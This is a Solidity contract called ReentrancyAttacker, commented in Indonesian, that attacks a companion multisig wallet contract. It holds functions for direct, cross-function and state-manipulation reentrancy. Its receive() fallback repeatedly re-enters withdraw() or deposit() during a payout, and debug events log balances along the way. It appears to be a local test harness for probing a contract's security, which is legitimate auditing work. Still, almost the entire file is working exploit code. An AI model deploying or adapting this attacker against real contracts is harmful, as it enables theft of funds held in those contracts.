// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import "./Multisig.sol";

interface IMultiSigTA {
    function deposit(string memory ticker, uint amount) external payable;
    function initiateWithdrawal(string memory ticker, uint amount) external;
    function withdraw() external;
    function getBalance(string memory ticker) external view returns(uint);
}

contract ReentrancyAttacker {
    IMultiSigTA private multisigContract;
    uint public attackCount = 0;
    bool public isAttacking = false;
    
    // Events untuk debug
    event DebugLog(string step, uint value);
    event BalanceLog(string message, uint contractBalance, uint multisigBalance);
    
    constructor(address _multisigAddress) payable {
        require(_multisigAddress != address(0), "Invalid multisig address");
        multisigContract = IMultiSigTA(_multisigAddress);
        emit BalanceLog(
            "Constructor Balance", 
            address(this).balance,
            multisigContract.getBalance("ETH")
        );
    }
    
    // Fungsi debug yang ditingkatkan
    function debugBalance() external view returns (uint, uint) {
        return (
            address(this).balance,
            multisigContract.getBalance("ETH")
        );
    }
    
    // 1. Direct Reentrancy Attack dengan debug yang lebih detail
    function attackDirectReentrancy() external {
        require(address(this).balance >= 1 ether, "Contract needs 1 ETH");
        
        emit BalanceLog(
            "Pre-deposit Balance",
            address(this).balance,
            multisigContract.getBalance("ETH")
        );
        
        // Deposit ETH ke multisig dengan try-catch
        try multisigContract.deposit{value: 1 ether}("ETH", 1 ether) {
            emit DebugLog("Deposit Success", 1 ether);
            
            emit BalanceLog(
                "Post-deposit Balance",
                address(this).balance,
                multisigContract.getBalance("ETH")
            );
            
            // Inisiasi withdrawal dengan try-catch
            try multisigContract.initiateWithdrawal("ETH", 1 ether) {
                emit DebugLog("InitiateWithdrawal Success", 1 ether);
                
                // Mencoba withdraw dengan try-catch
                try multisigContract.withdraw() {
                    emit DebugLog("First Withdrawal Success", 1 ether);
                } catch Error(string memory reason) {
                    emit DebugLog("Withdraw Failed", 0);
                }
            } catch Error(string memory reason) {
                emit DebugLog("InitiateWithdrawal Failed", 0);
            }
        } catch Error(string memory reason) {
            emit DebugLog("Deposit Failed", 0);
        }
    }
    
    // 2. Cross-Function Reentrancy Attack dengan debug
    function attackCrossFunctionReentrancy() external {
        require(address(this).balance >= 1 ether, "Contract needs 1 ETH");
        
        try multisigContract.deposit{value: 1 ether}("ETH", 1 ether) {
            emit DebugLog("Cross-Function Deposit Success", 1 ether);
            
            isAttacking = true;
            try multisigContract.initiateWithdrawal("ETH", 1 ether) {
                try multisigContract.withdraw() {
                    emit DebugLog("Cross-Function First Withdrawal Success", 1 ether);
                } catch Error(string memory reason) {
                    emit DebugLog("Cross-Function Withdraw Failed", 0);
                }
            } catch Error(string memory reason) {
                emit DebugLog("Cross-Function InitiateWithdrawal Failed", 0);
            }
        } catch Error(string memory reason) {
            emit DebugLog("Cross-Function Deposit Failed", 0);
        }
    }
    
    // 3. State Manipulation Attack dengan debug
    function attackStateManipulation() external {
        require(address(this).balance >= 1 ether, "Contract needs 1 ETH");
        
        try multisigContract.deposit{value: 1 ether}("ETH", 1 ether) {
            emit DebugLog("State Manipulation Deposit Success", 1 ether);
            
            uint initialBalance = multisigContract.getBalance("ETH");
            emit DebugLog("Initial Balance", initialBalance);
            
            try multisigContract.initiateWithdrawal("ETH", 1 ether) {
                try multisigContract.withdraw() {
                    uint finalBalance = multisigContract.getBalance("ETH");
                    emit DebugLog("Final Balance", finalBalance);
                    require(finalBalance < initialBalance, "State manipulation failed");
                } catch Error(string memory reason) {
                    emit DebugLog("State Manipulation Withdraw Failed", 0);
                }
            } catch Error(string memory reason) {
                emit DebugLog("State Manipulation InitiateWithdrawal Failed", 0);
            }
        } catch Error(string memory reason) {
            emit DebugLog("State Manipulation Deposit Failed", 0);
        }
    }
    
    // Fallback function dengan debug
    receive() external payable {
        emit DebugLog("Receive Called", msg.value);
        
        if (!isAttacking) {
            // Direct Reentrancy
            attackCount++;
            emit DebugLog("Attack Count", attackCount);
            
            if(attackCount < 3) {
                emit DebugLog("Attempting Reentry", attackCount);
                try multisigContract.withdraw() {
                    emit DebugLog("Reentry Withdrawal Success", 0);
                } catch Error(string memory reason) {
                    emit DebugLog("Reentry Withdrawal Failed", 0);
                }
            }
        } else {
            // Cross-Function Reentrancy
            if (address(this).balance >= 0.5 ether) {
                emit DebugLog("Attempting Cross-Function Reentry", address(this).balance);
                try multisigContract.deposit{value: 0.5 ether}("ETH", 0.5 ether) {
                    emit DebugLog("Cross-Function Reentry Deposit Success", 0.5 ether);
                } catch Error(string memory reason) {
                    emit DebugLog("Cross-Function Reentry Deposit Failed", 0);
                }
            }
        }
    }
}